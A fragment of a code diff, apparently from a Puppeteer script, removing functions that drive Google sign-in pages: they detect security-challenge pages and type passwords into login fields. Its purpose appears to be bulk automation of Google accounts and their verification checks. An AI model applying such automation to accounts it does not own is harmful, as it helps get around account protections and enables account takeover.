-            } else if (pageUrl.startsWith('https://accounts.google.com/') && pageUrl.includes('challenge') && pageUrl.includes('iap')) {
-                status = 5
-                break
-            } else if (pageUrl.startsWith('https://support.google.com/')) {
-                status = 9
-                break
-            } else if (selection) {
-                if (pageUrl.startsWith('https://accounts.google.com/') && pageUrl.includes('challenge') && pageUrl.includes('kpe')) {
-                    let data = await page.evaluate(() => {
-                        let root = document.querySelector('#knowledge-preregistered-email-response') 
-                        if (root) {
-                            return true
-                        }
-                        return false
-                    })
-    
-                    if (data) {
-                        status = 5
-                        break
-                    }
-                }
-            }
-        } catch (error) {}
-
-        if (timeout > 20) {
-            status = 0
-            break
-        }
-    }
-
-    return status
-}
-
-async function waitForPasswordType(password) {
-    
-    for (let i = 0; i < 10; i++) {
-        await delay(1000)
-
-        try {
-            let data = await exists(page, 'input[type="password"]')
-            if (data) {
-                await page.type('input[type="password"]', password)
-
-                let success = await page.evaluate((password) => {
-                    try {
-                        let root = document.querySelector('input[type="password"]')
-                        if (root && root.value == password) {
-                            return true
-                        }
-                    } catch (error) {}
-
-                    return false
-                }, password)
-
-                if (success) {
-                    break
-                }
-            }
-        } catch (error) {}
-    }
-}
-
-async function exists(_page, evement) {
-    return await _page.evaluate((evement) => {
-        let root = document.querySelector(evement)
-        if (root) {
-            return true
-        }
-        return false
-    }, evement)
-}
-
 
 function getRandomPassword() {
     let C = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
@@ -1062,14 +854,6 @@ async function patchAxios(url, body, data) {
         }
     }
     return responce
-}
-
-function getID() {
-    let id = mData.toString()
-    if (id.length == 1) {
-        return '|0'+mData+'|'
-    }
-    return '|'+mData+'|'
 }
 
 function delay(time) {
